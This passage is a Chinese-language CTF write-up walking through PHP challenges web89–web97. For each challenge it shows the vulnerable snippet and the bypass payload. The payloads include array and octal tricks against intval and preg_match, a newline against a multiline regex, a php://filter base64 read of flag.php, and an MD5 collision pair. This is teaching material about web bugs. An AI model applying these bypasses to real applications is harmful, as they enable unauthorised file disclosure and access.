class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>f(intval($num))–检查变量 <code>$num</code> 的整数值是否为真（即非零）</p>
<p>if(preg_match(“&#x2F;[0-9]&#x2F;“, $num))–用于检查变量 <code>$num</code> 是否包含至少一个数字字符（0-9）</p>
<h3 id="关于preg-match"><a href="#关于preg-match" class="headerlink" title="关于preg_match"></a>关于preg_match</h3><p>因为preg_match只能处理字符串，可以利用数组绕过，所以当传入的是数组时会返回false。</p>
<h3 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval()函数"></a>intval()函数</h3><p><code>intval()</code> 函数是 PHP 中的一个内置函数，它用于获取变量的整数值。这个函数尝试将给定的变量转换为整数类型，并返回转换后的结果。</p>
<p>函数原型</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">intval</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] )</span><br></pre></td></tr></table></figure>

<h3 id="数组绕过intval函数"><a href="#数组绕过intval函数" class="headerlink" title="数组绕过intval函数"></a>数组绕过intval函数</h3><p> intval 转换数组类型时 不关心数组中的内容 只判断数组中有没有元素，而intval函数当传入的变量是非空数组的时候，会返回1</p>
<p>payload:</p>
<p>?num[]&#x3D;1</p>
<h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>intval($num,0)===4476---intval($num, 0)</code> 将 <code>$num</code> 转换为整数。如果 <code>$num</code> 是字符串，可以转换为数字</p>
<h3 id="强比较"><a href="#强比较" class="headerlink" title="强比较(&#x3D;&#x3D;&#x3D;)"></a>强比较(&#x3D;&#x3D;&#x3D;)</h3><p>在 PHP 中，<strong>强比较</strong>（strict comparison）是指使用 <code>===</code> 和 <code>!==</code> 运算符进行的比较。这种比较不仅会检查两个值是否相等，还会检查它们的类型是否相同</p>
<ul>
<li><p><strong>强比较</strong>（<code>===</code>）：比较值和类型，不进行转换。</p>
</li>
<li><p>举个例子:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">5</span>;          <span class="comment">// 整数</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;5&quot;</span>;        <span class="comment">// 字符串</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> === <span class="variable">$b</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&#x27;<span class="subst">$a</span>&#x27; 和 &#x27;<span class="subst">$b</span>&#x27; 是相等的（强比较）。&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&#x27;<span class="subst">$a</span>&#x27; 和 &#x27;<span class="subst">$b</span>&#x27; 不相等。&quot;</span>; <span class="comment">// 这句会被执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，由于 <code>$a</code> 是整数，而 <code>$b</code> 是字符串，因此比较结果为不相等。</p>
</li>
</ul>
<h3 id="intval处理字符串"><a href="#intval处理字符串" class="headerlink" title="intval处理字符串"></a>intval处理字符串</h3><p>intval处理开头是数字的字符串时，返回值为开头的数</p>
<p><code>intval()</code>输入的值，如果是字符串，它返回的内容取决于字符串最左侧的字符</p>
<p><code>intval</code> 函数扫描参数字符串，跳过前面的空格字符，直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\0)结束转换，并将结果返回</p>
<p>paylaod:</p>
<p>?num&#x3D;4476a</p>
<h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>preg_match(&#39;/^php$/im&#39;, $a)</code>—检查变量 <code>$a</code> 中的内容是否完全匹配“php”，且对大小写不敏感。</p>
<p>**<code>^</code>**：匹配字符串的开始位置。这意味着字符串必须从这个模式开始。</p>
<p>**<code>php</code>**：字面值“php”，表示我们要匹配的具体字符串。</p>
<p>**<code>$</code>**：匹配字符串的结束位置。这意味着字符串必须以这个模式结束。</p>
<p>**<code>i</code>**：这是一个修饰符，表示匹配时不区分大小写（case-insensitive）。因此，会匹配“php”、“PHP”、“Php”等。</p>
<h3 id="preg-match多行匹配修饰符"><a href="#preg-match多行匹配修饰符" class="headerlink" title="preg_match多行匹配修饰符"></a>preg_match多行匹配修饰符</h3><p>**<code>m</code>**：这是多行匹配修饰符，影响 <code>^</code> 和 <code>$</code> 的行为。在多行模式下，这两个符号也可以匹配每一行的开始和结束，而不仅仅是整个字符串的开始和结束。在这个特定的例子中，<code>m</code> 修饰符的影响不大，因为我们是匹配整个字符串。</p>
<ul>
<li>im模式是可以匹配很多行,i模式只能匹配一行</li>
</ul>
<p>意味着这里的第一层匹配的是多行的php，而第二行匹配的是单行的php，所以我们加个换行符就行</p>
<p>payload:</p>
<p><code>?cmd=0%0aphp</code></p>
<h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较(&#x3D;&#x3D;)"></a>弱比较(&#x3D;&#x3D;)</h3><p>“弱比较”（或称为”非严格比较”）通常指的是在比较两个值时，不考虑它们的数据类型。当使用这个运算符比较两个值时，PHP 会尝试将它们转换为相同的类型，然后进行比较。<strong>但是弱比较（例如使用 <code>==</code> 运算符）不会进行进制转换</strong></p>
<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">5</span>;          <span class="comment">// 整数</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;5&quot;</span>;        <span class="comment">// 字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> == <span class="variable">$b</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&#x27;<span class="subst">$a</span>&#x27; 和 &#x27;<span class="subst">$b</span>&#x27; 是相等的（弱比较）。&quot;</span>; <span class="comment">// 这句会被执行</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&#x27;<span class="subst">$a</span>&#x27; 和 &#x27;<span class="subst">$b</span>&#x27; 不相等。&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，尽管 <code>$a</code> 是一个整数，而 <code>$b</code> 是一个字符串，但由于弱比较，PHP 会将 <code>$b</code> 转换为整数，然后比较，因此判断结果为相等。</p>
<h4 id="和强比较的区别"><a href="#和强比较的区别" class="headerlink" title="和强比较的区别"></a>和强比较的区别</h4><p>两个等号是<strong>先把等号两边的变量转化成相同的类型</strong>，如果转换类型后的结果是相等的，就认为相等。</p>
<p>三个等号是<strong>先判断两边变量的数据类型</strong>，如果数据类型相同，再去判断两边的值，如果值相等，那么为真。</p>
<h3 id="关于intval-函数汇总"><a href="#关于intval-函数汇总" class="headerlink" title="关于intval()函数汇总"></a>关于intval()函数汇总</h3><p><strong>intval</strong> 函数是PHP中用于获取变量的整数值的函数。它通过使用指定的进制（默认是十进制）来转换变量，并返回其整数值。</p>
<h4 id="intval-函数的基本语法"><a href="#intval-函数的基本语法" class="headerlink" title="intval 函数的基本语法"></a><strong>intval</strong> 函数的基本语法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>])</span><br></pre></td></tr></table></figure>

<p>其中，*$var* 是需要转换成整数的变量，*$base* 是转换所使用的进制。如果*$base<em>是0，则会根据</em>$var<em>的格式来决定使用的进制。例如，如果字符串以”0x”开头，则使用16进制；如果字符串以”0”开头，则使用8进制；否则，默认使用10进制。*<em>intval</em></em> 函数的返回值是变量的整数值。如果转换失败，它会返回0。对于空数组，它返回0，而对于非空数组，它返回1。</p>
<h4 id="intval绕过思路"><a href="#intval绕过思路" class="headerlink" title="intval绕过思路"></a>intval绕过思路</h4><p>在某些情况下，<strong>intval</strong> 函数可能被用于验证输入值。如果某个特定的值被过滤或禁止，可以通过<strong>改变进制或添加小数点</strong>等方式来绕过这些限制。例如，如果数字10被过滤，可以使用它的8进制表示<em>012</em>或16进制表示<em>0xA</em>来绕过。对于弱类型比较（如<em>a&#x3D;&#x3D;b</em>），可以传入空数组使得比较结果为<em>true</em>。此外，如果需要绕过数字限制，可以通过增加小数位（如<em>3.1</em>）或使用算术运算符（如<em>5+5</em>）来实现。</p>
<p>payload:</p>
<p>方法一:使用非十进制数传递</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">num</span>=010574(八进制)</span><br><span class="line">?<span class="attribute">num</span>=0x117c(十六进制)</span><br></pre></td></tr></table></figure>

<p>方法二:使用科学计数法</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">num</span>=4476e123</span><br></pre></td></tr></table></figure>

<p>(根据intval处理字符串的机制)</p>
<h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>禁用了字母，但采用八进制和小数点都可以绕过</p>
<h3 id="弱比较之浮点数和整数"><a href="#弱比较之浮点数和整数" class="headerlink" title="弱比较之浮点数和整数"></a>弱比较之浮点数和整数</h3><p>在 PHP 中，弱比较（使用 <code>==</code> 运算符）确实可能会受到小数点的影响，浮点数和字符串中的数字在 PHP 中可以通过弱比较被认为是相等的，前提是它们的数值相同。但对于浮点数4476.1和整数4476在php中整数在比较时会被视为浮点数，php会将4476转化成浮点数4476.1，然后进行比较，可见这两个浮点数是不相等的。详细可以参考类型转换的规则</p>
<p>payload:</p>
<p><code>?num=4476.1</code>or<code>?num=?num=010574(八进制)</code></p>
<h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>strpos($num, “0”)</p>
<h3 id="strpos函数"><a href="#strpos函数" class="headerlink" title="strpos函数"></a>strpos函数</h3><p>在 PHP 中，<code>strpos()</code> 函数用于查找一个字符串在另一个字符串中首次出现的位置</p>
<p>基本语法：</p>
<p><code>strpos(string $haystack, string $needle, int $offset = 0): int|false</code></p>
<ul>
<li><p><strong>$haystack</strong>：要搜索的字符串。</p>
</li>
<li><p><strong>$needle</strong>：要查找的字符串（或字符）。</p>
</li>
<li><p><strong>$offset</strong>：可选的参数，指定从哪个位置开始搜索。</p>
</li>
<li><p>如果找到了字符，<code>strpos()</code> 会返回字符首次出现的位置（从 <code>0</code> 开始计数）。</p>
</li>
</ul>
<p>所以这道题的payload中必须有0 但不能是开头为0，如果开头为0会导致输出的0所在的位置是0，那么!0就是1，就会执行里面的die函数</p>
<p>payload:</p>
<p><code>?num=4476.0</code>或者在010574八进制数字前加上空格符(其他换行符什么的也行)或者+号保证第一个0出现的位置不是0</p>
<h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次比之前多过滤了小数点，那就不用小数点进行绕过，我们用八进制加上一些空白符号就行了</p>
<p>payload:</p>
<p>?num&#x3D;%20010574</p>
<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了flag.php</p>
<h3 id="highlight-file-函数"><a href="#highlight-file-函数" class="headerlink" title="highlight_file()函数"></a>highlight_file()函数</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">highlight_file</span><span class="params">(<span class="variable">$filename</span>,<span class="variable">$return</span>)</span></span></span><br><span class="line"><span class="variable">$filename</span>  必需。要进行高亮处理的 PHP 文件的路径。</span><br><span class="line"><span class="variable">$return</span>     可选。如果设置 true，则本函数返回高亮处理的代码。</span><br></pre></td></tr></table></figure>

<p>这里使用绝对路径或者当前路径绕过：</p>
<p><code>u=./flag.php    //相对路径 u=/var/www/html/flag.php   //由于绝对路径是已知的，所以直接使用</code></p>
<p>或者可以用php伪协议去做</p>
<p><code>?u=php://filter/resource=flag.php</code></p>
<p><code>u=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>因为这个条件语句检查 URL 查询参数 <code>u</code> 的值是否等于字符串 <code>&#39;flag.php&#39;</code></p>
<p>但是这个只读流的值实际上是一个特殊的过滤器，而不是简单的字符串 <code>&#39;flag.php&#39;</code>。具体如下：</p>
<ol>
<li>**<code>php://filter</code>**：这是一个 URL 流，允许你使用 PHP 内置的过滤器来读取或写入数据。</li>
<li>**<code>read=convert.base64-encode</code>**：这部分指定了一个过滤器，它会将 <code>flag.php</code> 资源的内容读取并进行 Base64 编码。</li>
<li>**<code>resource=flag.php</code>**：这部分指定了要读取的资源。</li>
</ol>
<h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>md5($_POST[‘a’]) &#x3D;&#x3D;&#x3D; md5($_POST[‘b’])–用来比较两个通过 HTTP POST 请求提交的字段 <code>a</code> 和 <code>b</code> 的 MD5 哈希值是否相等</p>
<p>要求：1、用 POST 方式传递参数</p>
<p>　　  2、参数 a、b 不相等</p>
<p>　　  3、两参数 MD5 相等</p>
<h3 id="md5哈希值"><a href="#md5哈希值" class="headerlink" title="md5哈希值"></a>md5哈希值</h3><p>MD5（Message-Digest Algorithm 5）是一种广泛使用的哈希函数，它会将任意长度的数据（通常是字符串）映射为一个固定长度的输出，即 128 位（16 字节）的哈希值。通常，MD5 的输出以 32 位的十六进制数字表示。</p>
<p>对于php强比较和弱比较：md5()函数无法处理数组，如果传入的为数组，会返回NULL，两个数组经过加密后得到的都是NULL，也就是相等的。</p>
<p>做题方法:</p>
<h4 id="用数组进行绕过md5验证"><a href="#用数组进行绕过md5验证" class="headerlink" title="用数组进行绕过md5验证"></a>用数组进行绕过md5验证</h4><p>传入两个不同的数组，经md5加密后结果都是null，比较则相等</p>
<p>payload:</p>
<p><code>a[]=1&amp;b[]=2</code></p>
<p>(注意不要让这两个数组的元素值相等哈，不然就不会绕过第一层判断了)</p>
<h4 id="md5强碰撞"><a href="#md5强碰撞" class="headerlink" title="md5强碰撞"></a>md5强碰撞</h4><p>对于 md5 强碰撞，我们需要找到两个 md5 值真正相同的数据。</p>
<p>payload:</p>
<p>十六进制格式的两个不同字符串：</p>
<p><code>4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2</code><br><code>4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2</code><br>两者都有 MD5 哈希： </p>
<p><code>008ee33a9d58b51cfeb425b0959121c9</code></p>
<p>还有一个特别的方法，是关于md5在弱比较下的缺点漏洞</p>
<p>在弱比较中</p>
<p>对于某些特殊的字符串加密后得到的密文以0e开头，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同。但是这里并不是弱比较，因此该方法不行，可以作为方法进行积累应用</p>
